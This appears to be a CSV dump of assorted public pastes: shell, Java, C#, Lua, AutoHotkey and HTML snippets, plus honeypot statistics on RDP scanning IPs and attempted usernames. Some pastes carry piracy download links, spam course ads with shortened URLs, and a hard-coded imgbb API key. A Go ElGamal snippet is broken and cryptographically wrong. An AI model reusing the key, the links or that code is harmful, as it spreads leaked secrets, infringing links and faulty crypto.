id,title,username,language,date,content
  },
  ""client_name"": {
    ""Unknown"": 154
  },
  ""ip_type"": {
    ""Unknown"": 76,
    ""hosting"": 64,
    ""proxy"": 10,
    ""mobile"": 4
  }
}"
Q43PdSQL,lvmanager.sh,sergio_educacionit,Bash,Friday 22nd of December 2023 06:15:14 PM CDT,"#!/bin/bash

cmd=$1
size=$2
name=$3
group=$4
volume=$2

func_help () {

echo ""Modo de uso:

Listar volumenes

$0 -L

Crear volumen

$0 -C tamaño nombre grupo

Eliminar volumen

$0 -R /rutal/al/volumen


Listar grupos

$0 -G

Imprimir ayuda

$0 --help
""

}
case $cmd in

	-C)
		lvcreate -L ${size}G -n $name $group
		lvs
		vgs
		pvs
		;;
	-G)
		vgs 
		;;
	-L)
		lvs
		;;
	-R)
		lvremove $volume
		;;

	--help)
		func_help
		;;
	*)
		func_help
		;;
esac"
d8fQGZ0M,2023-12-22_stats.json,rdp_snitch,JSON,Friday 22nd of December 2023 06:15:09 PM CDT,"{
  ""ip"": {
    ""194.165.16.72"": 2,
    ""195.181.244.184"": 1,
    ""143.244.140.170"": 4,
    ""191.101.41.66"": 1,
    ""205.210.31.64"": 3,
    ""167.94.146.58"": 1,
    ""185.170.144.113"": 6,
    ""87.251.75.64"": 1,
    ""62.204.41.208"": 8,
    ""87.251.75.145"": 3,
    ""185.170.144.3"": 2,
    ""194.165.16.37"": 4,
    ""179.60.147.118"": 1,
    ""87.251.75.120"": 2,
    ""198.235.24.169"": 3,
    ""43.156.60.84"": 1,
    ""43.156.180.247"": 4,
    ""94.232.45.92"": 3,
    ""188.121.99.171"": 2,
    ""51.75.160.42"": 6,
    ""122.3.71.174"": 2,
    ""196.190.117.7"": 2,
    ""152.32.156.136"": 1,
    ""69.75.118.251"": 1,
    ""198.235.24.148"": 3,
    ""67.133.192.80"": 1,
    ""172.234.49.188"": 1,
    ""103.183.121.117"": 2,
    ""13.68.209.94"": 1,
    ""167.94.145.59"": 1,
    ""198.235.24.97"": 3,
    ""185.255.130.124"": 1
  },
  ""asn"": {
    ""AS48721"": 6,
    ""AS212531"": 1,
    ""AS14061"": 4,
    ""AS206092"": 1,
    ""AS396982"": 12,
    ""AS398705"": 2,
    ""AS197414"": 8,
    ""AS208091"": 6,
    ""AS59425"": 8,
    ""AS209588"": 1,
    ""AS132203"": 5,
    ""AS212482"": 3,
    ""AS202468"": 2,
    ""AS16276"": 6,
    ""AS9299"": 2,
    ""AS24757"": 2,
    ""AS135377"": 1,
    ""AS20001"": 1,
    ""AS209"": 1,
    ""AS63949"": 1,
    ""AS135918"": 2,
    ""AS8075"": 1,
    ""AS147049"": 1
  },
  ""isp"": {
    ""Flyservers S.A."": 7,
    ""UAB \""Interneto vizija\"""": 1,
    ""DigitalOcean, LLC"": 4,
    ""Ipxo Limited"": 1,
    ""Google LLC"": 12,
    ""Censys, Inc."": 2,
    ""Xhost Internet Solutions LP"": 17,
    ""Horizon LLC"": 8,
    ""Shenzhen Tencent Computer Systems Company Limited"": 5,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 2,
    ""OVH SAS"": 6,
    ""Philippine Long Distance Telephone Co."": 2,
    ""Ethiotelecom"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Charter Communications Inc"": 1,
    ""CenturyLink"": 1,
    ""Akamai Technologies, Inc."": 1,
    ""GRCITY"": 2,
    ""Microsoft Corporation"": 1,
    ""PacketHub S.A."": 1
  },
  ""org"": {
    ""Flyservers S.A"": 6,
    ""RACKRAY"": 1,
    ""DigitalOcean, LLC"": 4,
    ""Ipxo"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Censys, Inc."": 2,
    ""Xhostis"": 8,
    ""Xhost Internet Solutions"": 6,
    ""Horizon LLC"": 8,
    ""Cloud Solutions S.A"": 1,
    ""Tencent Cloud Computing"": 5,
    ""Dmitriy Panchenko"": 3,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 2,
    ""OVH Ltd"": 6,
    ""Philippine Long Distance Telephone Company"": 2,
    ""Unknown"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Spectrum"": 1,
    ""CenturyLink, Inc"": 1,
    ""Akamai Technologies, Inc."": 1,
    ""GREEN CITY Construction Investment Joint Stock Company"": 2,
    ""Microsoft Azure Cloud (eastus)"": 1,
    ""Packethub S.A"": 1
  },
  ""regionName"": {
    ""Kaunas"": 7,
    ""Karnataka"": 4,
    ""New York"": 1,
    ""California"": 13,
    ""Hesse"": 2,
    ""North Holland"": 14,
    ""Moscow"": 8,
    ""Distrito Federal"": 1,
    ""North West"": 6,
    ""Perm Krai"": 3,
    ""Tehran"": 2,
    ""England"": 6,
    ""Metro Manila"": 2,
    ""Addis Ababa"": 2,
    ""Maharashtra"": 1,
    ""New Jersey"": 1,
    ""Gia Lai Province"": 2,
    ""Virginia"": 1,
    ""Texas"": 1
  },
  ""country"": {
    ""Lithuania"": 7,
    ""India"": 5,
    ""United States"": 17,
    ""Germany"": 2,
    ""The Netherlands"": 14,
    ""Russia"": 11,
    ""Venezuela"": 1,
    ""Singapore"": 6,
    ""Iran"": 2,
    ""United Kingdom"": 6,
    ""Philippines"": 2,
    ""Ethiopia"": 2,
    ""Vietnam"": 2
  },
  ""account"": {
    ""Test"": 16,
    ""hello"": 20,
    ""(empty)"": 4,
    ""ruRBFFJuY"": 1,
    ""lzcnHn"": 1,
    ""dfokfW"": 1,
    ""Domain"": 15,
    ""Administr"": 9,
    ""zQcJteBBj"": 1,
    ""KSELCp"": 1,
    ""sBqmHY"": 1,
    ""Administrator"": 1,
    ""hcvcumvWl"": 1,
    ""vcTNMK"": 1,
    ""qSWPYU"": 1,
    ""GnpMeWxlJ"": 1,
    ""AAmEMV"": 1,
    ""MGDGvO"": 1
  },
  ""keyboard"": {
    ""Unknown"": 77
  },
  ""client_build"": {
    ""Unknown"": 77
  },
  ""client_name"": {
    ""Unknown"": 77
  },
  ""ip_type"": {
    ""Unknown"": 38,
    ""hosting"": 32,
    ""proxy"": 5,
    ""mobile"": 2
  }
}"
dYMX0479,Install Fider,Justman10000,Bash,Friday 22nd of December 2023 04:44:48 PM CDT,"You need NodeJS (https://pastebin.com/Rf1vVKsR)
You need Go     (https://pastebin.com/qFQRy0FX)

mkdir /home/Fider
cd /home/Fider
git init
git pull https://github.com/getfider/fider.git

yarn
go build -ldflags '-s -w -X github.com/getfider/fider/app/pkg/env.commithash=${COMMITHASH}' -o fider .
NODE_ENV=production yarn npx webpack-cli
yarn npx lingui extract public/
yarn npx lingui compile
NODE_ENV=production node esbuild.config.js

go install github.com/cosmtrek/air
go install github.com/joho/godotenv/cmd/godotenv@latest
ln -s /root/go/bin/godotenv /usr/bin
mv .example.env .env

godotenv -f .env ./fider migrate

godotenv -f .env ./fider &
echo $! > pid"
c5rsYvUU,Die.Feuerzangenbowle.1944.Deu.DVDRip.h264.ac3.Subs-bp,bpmircea,BrainFuck,Friday 22nd of December 2023 04:20:01 PM CDT,"Die Feuerzangenbowle (The Punch Bowl) (Helmut Weiss, 1944)
aka
Die.Feuerzangenbowle.1944.Deu.DVDRip.h264.ac3.Subs-bp
https://www.imdb.com/title/tt0036818/

https://filecrypt.cc/Container/EB8DB6833F.html

Audio tracks: de | Subtitles: de en es ru"
A0K5J47S,Die.Feuerzangenbowle.1944.Deu.DVDRip.mpeg.ac3.Subs-bp,bpmircea,BrainFuck,Friday 22nd of December 2023 04:19:01 PM CDT,"Die Feuerzangenbowle (The Punch Bowl) (Helmut Weiss, 1944)
aka
Die.Feuerzangenbowle.1944.Deu.DVDRip.mpeg.ac3.Subs-bp
https://www.imdb.com/title/tt0036818/

https://filecrypt.cc/Container/772780E804.html

Audio tracks: de | Subtitles: de en es ru"
jw3aDhBb,Untitled,Skos_Martren,C++,Friday 22nd of December 2023 02:42:08 PM CDT,"#include ""mainwindow.h""
#include ""ui_mainwindow.h""

#include <QAbstractTableModel>
#include <QVariant>
#include <QVector>
#include <QApplication>
#include <QTableView>
#include <QHeaderView>

class CustomTableModel : public QAbstractTableModel {

public:

    CustomTableModel(const QVector<QVector<QString>>& data, const QStringList& headers, QObject* parent = nullptr)
        : QAbstractTableModel(parent), m_data(data), m_headers(headers) {}

    int rowCount(const QModelIndex& parent = QModelIndex()) const override {
        Q_UNUSED(parent);
        return m_data.size();
    }

    int columnCount(const QModelIndex& parent = QModelIndex()) const override {
        Q_UNUSED(parent);
        return m_headers.size();
    }

    QVariant data(const QModelIndex& index, int role = Qt::DisplayRole) const override {
        if (!index.isValid())
            return QVariant();

        if (role == Qt::DisplayRole)
            return m_data[index.row()][index.column()];

        return QVariant();
    }

    QVariant headerData(int section, Qt::Orientation orientation, int role = Qt::DisplayRole) const override {
        if (role == Qt::DisplayRole && orientation == Qt::Horizontal)
            return m_headers.at(section);

        return QVariant();
    }

private:
    QVector<QVector<QString>> m_data;
    QStringList m_headers;
};


MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    // Пример данных для модели
    QVector<QVector<QString>> data {
        {""Alice"", ""25"", ""Engineer""},
        {""Bob"", ""30"", ""Developer""},
        {""Charlie"", ""22"", ""Designer""}
    };

    // Заголовки столбцов
    QStringList headers {""Name"", ""Age"", ""Occupation""};

    // Создаем модель
    CustomTableModel model(data, headers);


    ui->tableView->setModel(&model);
}

MainWindow::~MainWindow()
{
    delete ui;
}

"
vkhe0u6C,Untitled,poxipox,Lua,Friday 22nd of December 2023 01:58:19 PM CDT,"                if topCreat.uid > 0 and isPlayer(topCreat.uid) then
                    if questCfg_1.storage > 0 then
                        if getPlayerStorageValue(topCreat.uid, questCfg_1.storage) == -1 and getPlayerLevel(topCreat.uid) < questCfg_1.level then
								
                            	table.insert(player, topCreat.uid)
						else
							doPlayerSendTextMessage(cid,19,""Error, done or you no have "" .. questCfg_1.level .. ""+ level!"")
                        end
                    else
                        table.insert(player, topCreat.uid)
                    end
                end"
XKFhSsMe,Untitled,kwest87,C#,Friday 22nd of December 2023 01:52:56 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp4
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int albumPictures = 52;
            int rowPictures = 3;
            int filledRow;
            int extraPictures;

            filledRow = albumPictures / rowPictures;
            extraPictures = albumPictures % rowPictures;

            Console.WriteLine($""{filledRow} рядов заполнены картинками , {extraPictures} картинок осталось."");
        }
    }
}"
utzjrFZH,ReviewService,MartinKoleff,Java,Friday 22nd of December 2023 01:25:36 PM CDT,"package com.jaba.vgl.services;

import com.jaba.vgl.models.dto.ReviewDto;
import com.jaba.vgl.models.entities.Review;

public interface ReviewService {

    Review getReview(Long id);

    void saveReview(ReviewDto reviewDto);

    int deleteReview(Long id);

    void updateReview(ReviewDto reviewDto);

    void truncateTable();
}
"
k07zUb7U,ReviewServiceImpl,MartinKoleff,Java,Friday 22nd of December 2023 01:25:13 PM CDT,"package com.jaba.vgl.services.impl;

import com.jaba.vgl.exceptions.GameNotFoundException;
import com.jaba.vgl.exceptions.ReviewNotFoundException;
import com.jaba.vgl.models.dto.ReviewDto;
import com.jaba.vgl.models.dto.mapper.ReviewDtoMapper;
import com.jaba.vgl.models.entities.Review;
import com.jaba.vgl.repositories.ReviewRepository;
import com.jaba.vgl.services.ReviewService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

@Service
public class ReviewServiceImpl implements ReviewService {

    private final ReviewRepository reviewRepository;
    private final ReviewDtoMapper reviewDtoMapper;

    @Autowired
    public ReviewServiceImpl(ReviewRepository reviewRepository,
                             ReviewDtoMapper reviewDtoMapper) {
        this.reviewRepository = reviewRepository;
        this.reviewDtoMapper = reviewDtoMapper;
    }

    @Override
    public Review getReview(Long id) {
        return reviewRepository
                .findById(id)
                .orElseThrow(() -> new ReviewNotFoundException(
                        String.format(""Review with id %d not found."",
                                id
                        )
                ));
    }

    @Override
    public void saveReview(ReviewDto reviewDto) {
        Review review = reviewDto.toEntity();

        reviewRepository.save(review);
    }

    @Override
    public int deleteReview(Long id) {
        return reviewRepository.deleteReviewById(id);
    }

    @Override
    public void updateReview(ReviewDto reviewDto) {
        Review review = reviewDto.toEntity();

        reviewRepository.updateReview(review.getId(), review.getGameId(), review.getTitle(), review.getText(), review.getRating());
    }

    @Override
    public void truncateTable() {
        reviewRepository.truncate();
    }
}
"
myRuvSwS,Moloch.1999.Deu.DVDRip.h264.ac3.Subs-bp,bpmircea,BrainFuck,Friday 22nd of December 2023 01:17:25 PM CDT,"Molokh (Moloch) (Aleksandr Sokurov, 1999)
aka
Moloch.1999.Deu.DVDRip.h264.ac3.Subs-bp
https://www.imdb.com/title/tt0199777/

https://filecrypt.cc/Container/FE10A723AD.html

Audio tracks: de | Subtitles: en es"
7Cqqs0cA,Untitled,Falexom,Go,Friday 22nd of December 2023 01:11:33 PM CDT,"package main

import(
	""fmt""
	""math/rand""
	""strconv""
)

func gcd(a, b int) int output{
	if a < b {
		return gcd(b, a)
	}

	else if a % b == 0 {
		return b
	}

	else {
		return gcd(b, a%b)
	}
}

func gen_key(q int) int{
	key := rand.Intn(1, q-1)
	var flag = 0
	for flag != 1 {
		flag := gcd(q, key)
		if flag == 1{
			break
		}
		key := rand.Intn(1, q-1)
	}
	return key
}

func power(a, b, c int) int {
	var x = 1
	var y = 2

	for b > a {
		if b % 2 != 0 {
			x = (x * y) % c
		}
		y = (y * y) % c
	}
	return x % c
}

func encrypt(msg string, q, h, g *big.Int) ([]*big.Int, *big.Int) {
	enMsg := make([]*big.Int, len(msg))
   
	k := genKey(q) // Private key for sender
	s := power(h, k, q)
	p := power(g, k, q)
   
	for i := 0; i < len(msg); i++ {
	 enMsg[i] = new(big.Int).SetInt64(int64(msg[i]))
	}
   
	fmt.Println(""g^k used:"", p)
	fmt.Println(""g^ak used:"", s)
   
	for i := 0; i < len(enMsg); i++ {
	 enMsg[i].Mul(enMsg[i], s)
	}
   
	return enMsg, p
   }
   

func decrypt(enMsg []*big.Int, p, key, q *big.Int) string {
	drMsg := make([]byte, len(enMsg))
	h := power(p, key, q)
   
	for i := 0; i < len(enMsg); i++ {
	 enMsg[i].Div(enMsg[i], h)
	 drMsg[i] = byte(enMsg[i].Int64())
	}
   
	return string(drMsg)
   }
   

func main() {
	var msg = []string{""h"", ""e"", ""l"", ""l"", ""o""}
	var p = rand.Intn(100000000000000000000, 100000000000000000000000000000000000000000000000000)
	var q = rand.Intn(2, p)
	var g = rand.Intn(2, q)
	key := gen_key(q)
	h := power(g, key, q)
	enMsg, p := encrypt(msg, big.NewInt(int64(q)), h, big.NewInt(int64(g)))
    drMsg := decrypt(enMsg, big.NewInt(int64(p)), big.NewInt(int64(key)), big.NewInt(int64(q)))
	fmt.Println(dr_msg)
}"
zGub5tJ0,Pet Simulator 99 Auto Fish,Killyoboy,Autohotkey,Friday 22nd of December 2023 12:05:47 PM CDT,"#MaxThreadsPerHotKey, 2
Toggle := 0

F1::
Toggle := !Toggle
MouseDown := False

While Toggle {
    PixelSearch, greyX, greyY, 1485, 255, 1512, 862, 0xE3CBC7, 5, fast ;;grey
    PixelSearch, greenX, greenY, 1485, 255, 1512, 862, 0x12F88B, 5, fast ;;green

    If (greenY or greyY) {
        If (!greenY) {
            MouseDown := !MouseDown
            
            if(MouseDown) {
                Send {Click down}
                x := 0
                green := False
                
                Loop {
                    Sleep, 50
                    PixelSearch, greenX, greenY, 1485, 255, 1512, 862, 0x12F88B, 5, fast ;;green
                    
                    if(greenY) {
                        green := True
                    }
                    
                    x += 1
                } Until (x >= 15 or green)

            } else {
                Send {Click up}
                
                x := 0
                green := False
                
                Loop {
                    Sleep, 50
                    PixelSearch, greenX, greenY, 1485, 255, 1512, 862, 0x12F88B, 5, fast ;;green
                    
                    if(greenY) {
                        green := True
                    }
                    x += 1
                } Until (x >= 15 or green)
            }
        } else {
	    ;MouseDown := !MouseDown
            
            green := True
            
            Loop {
                Send {Click down}
                Sleep, 100
                Send {Click up}
                Sleep, 50
                PixelSearch, greenX, greenY, 1485, 255, 1512, 862, 0x12F88B, 5, fast ;;green
                
                if(not greenY) {
                    green := False
                }
            } Until (not green)
        }
    } else {
        MouseDown := False
        Send {Click down}
        Sleep, 100
        Send {Click up}
        Sleep, 3000
        Send {Click down}
    }
}"
fkd4mq33,Untitled,sissou123,C#,Friday 22nd of December 2023 12:03:42 PM CDT,"Complete C# Unity Game Developer 2D
Learn Unity in C# & Code Your First Five 2D Video Games for Web, Mac & PC. The Tutorials Cover Tilemap 
for more:https://dz-linkk.com/Csl81
"
fAwySErf,geoscanner.lua,iconmaster,Lua,Friday 22nd of December 2023 11:55:00 AM CDT,"local completion = require ""cc.completion""
local scanner = peripheral.find(""geoScanner"")

local args = { ... }
if #args < 1 then
    printError(""error: needs 1 argument (radius)"")
    return
end
local radius = tonumber(args[1])
if not radius then
    printError(""error: invalid radius"")
    return
end

local cost, err = scanner.cost(radius)
if err then
    printError(""error: when calculating cost: "" .. err)
    return
end
print(""Cost: "" .. cost .. "" FE"")

local function possiblyRefuel(cost)
    local fuel = turtle.getFuelLevel();
    if fuel ~= ""unlimited"" then
        print(""Fuel: "" .. fuel .. "" FE"")
        if cost > fuel then
            print(""Energy deficit: "" .. (fuel - cost) .. "" FE"")
            write(""Refuel? [Yn] "")
            local choice = read()
            if choice == """" or choice == ""y"" or choice == ""Y"" then
                for i = 1, 16 do
                    turtle.select(i)
                    turtle.refuel()
                end
                print(""Turtle refueled."")
                return possiblyRefuel(cost)
            else
                printError(""error: not enough fuel"")
                return false
            end
        end
    end
    return true
end

if not possiblyRefuel(cost) then return end

if scanner.getScanCooldown and scanner.getScanCooldown() > 0 then
    print(""Waiting for scanner cooldown ("" .. scanner.getScanCooldown() .. ""s)..."")
    sleep(scanner.getScanCooldown() + 1)
end

print(""Scanning..."")
local scanResult, err = scanner.scan(radius)
if err then
    printError(""error: when scanning: "" .. err)
    return
end

print(""Scan complete. Analyzing..."")
local totals = {}
local sum = 0
for i, block in ipairs(scanResult) do
    if totals[block.name] then
        totals[block.name] = totals[block.name] + 1
    else
        totals[block.name] = 1
    end
    sum = sum + 1
end

print(""Scanned "" .. sum .. "" blocks. Results:"")
local TERM_ROWS = 13
local row = 0
for name, amount in pairs(totals) do
    print(""  "" .. name .. "": "" .. amount)
    row = row + 1
    if row >= TERM_ROWS - 2 then
        read()
        row = 0
        print(""Scanned "" .. sum .. "" blocks. Results:"")
    end
end

local function get_keys(t)
    local keys = {}
    for key, _ in pairs(t) do
        table.insert(keys, key)
    end
    return keys
end

local keys = get_keys(totals)
while true do
    write(""Get positions of block? "")
    local result = read(nil, nil, function(s) return completion.choice(s, keys) end)
    if result == """" then
        break
    end
    if not totals[result] then
        printError(""error: unknown block"")
    else
        local row = 0
        for i, block in ipairs(scanResult) do
            if block.name == result then
                print(""  "" .. i .. "": ("" .. block.x .. "", "" .. block.y .. "", "" .. block.z .. "")"")
                row = row + 1
                if row >= TERM_ROWS - 1 then
                    read()
                    row = 0
                end
            end
        end
    end
end
"
PznDkDfQ,Untitled,shawon_majid,TypeScript,Friday 22nd of December 2023 11:50:37 AM CDT,"import express from 'express';
import dotenv from 'dotenv';
import * as path from 'path';
import multer from 'multer';
import bodyParser from 'body-parser';
import axios from 'axios';
import FormData from 'form-data';


const baseImagePath =  path.join(__dirname, '../', 'images')

const ibbAPIkey = '6cbbe4f41c6a665ed39a66645f2c7bcb'

const profilePhotoPath = path.join(baseImagePath, 'user_profile_photos')
const storage = multer.memoryStorage()

const app = express();
const upload = multer({storage:storage })
dotenv.config();
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({extended: true}))
app.get('/', (req, res) => {
    res.send('<h1>Hello World</h1>');
});

const filePath = path.join(__dirname, '../', 'images', 'user_cover_photos')

app.get('/image', (req, res)=>{
    res.sendFile(path.join(filePath, 'shawon majid2.png'))
})

app.post('/upload', upload.single('image'), async (req, res) => {
  try {
    const form = new FormData();
    form.append('key', ibbAPIkey);
    form.append('image', req.file?.buffer, { filename: 'image.png' });

    const ibbResponse = await axios.post('https://api.imgbb.com/1/upload', form, {
      headers: form.getHeaders(),
    });

    console.log(ibbResponse.data.data.image.url);
    res.send('File uploaded successfully');
  } catch (error) {
    console.log(error)
    res.status(500).send('Failed to upload');
  }
});

app.listen(process.env.PORT, () => {
    console.log('Server is listening on port: ' + process.env.PORT + '...');
});
"
sE1GYpMw,Untitled,sissou123,Python,Friday 22nd of December 2023 11:48:24 AM CDT,"Learn Python & Ethical Hacking From Scratch
Write 20+ hacking programs to learn hacking & programming at the same time | No prior knowledge required 
for more:https://dz-linkk.com/xqd2VN
"
7Re8zX8t,Collapsible Collections,Jade-Everstone,HTML,Friday 22nd of December 2023 11:47:13 AM CDT,"<!--Collapsible Collections snippet

Example sections include Ribbons and Stamps

-->

<!-- /// TOGGLE /// -->
<p style=""text-align:center"">
    <a href=""#collect"" data-toggle=""collapse"" role=""button"" aria-expanded=""false"" aria-controls=""collect"">(click to see collections)</a>
</p>
<!-- /// END TOGGLE /// -->


<!-- /// COLLAPSE /// -->
<div class=""collapse"" id=""collect"">
<div class=""container my-3"" style=""max-width:1000px;text-align:center;"">
    
    
    <!--// Single Collection // -->
    <h2>Single Collection</h2>
    <div class=""bg-faded p-2 my-3 mx-auto d-flex flex-wrap justify-content-center"" style=""max-width:500px"">
        
        <!-- Ribbon examples -->
        
        <a href="" SOURCE ""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""m-2"">
        </a>
        
        
        <a href="" SOURCE "" class=""tooltipster"" data-placement=""top""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""d-block m-2"">
        </a>
        
        
        <a href="" SOURCE "" class=""tooltipster"" data-placement=""top""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""d-block m-2"">
        </a>
        
        
        <a href="" SOURCE "" class=""tooltipster"" data-placement=""top""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""d-block m-2"">
        </a>
        
        
        <a href="" SOURCE "" class=""tooltipster"" data-placement=""top""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""d-block m-2"">
        </a>
        
        
        <a href="" SOURCE "" class=""tooltipster"" data-placement=""top""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""d-block m-2"">
        </a>
        
        
        <a href="" SOURCE "" class=""tooltipster"" data-placement=""top""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""d-block m-2"">
        </a>
        
    </div>
    <!--// End Single Collection // -->
    
    
    <!-- // Row Collections // -->
    <div class=""row my-3"">
        
        <!--collection 1-->
        <div class=""col-lg-6"">
            <h2>Row Collection 1</h2>
            <div class=""bg-faded p-2 my-3 mx-auto d-flex flex-wrap justify-content-center"">
                
                <!--Stamp Examples-->
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                
            </div>
        </div>
        
        
        <!--collection 1-->
        <div class=""col-lg-6"">
            <h2>Row Collection </h2>
            <div class=""bg-faded p-2 my-3 mx-auto d-flex flex-wrap justify-content-center"">
                
                <!--Stamp Examples-->
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                
            </div>
        </div>
        
    </div>
    <!-- // End Row Collectiosn // -->
    
    
</div>
</div>
<!-- /// END COLLAPSE /// -->"
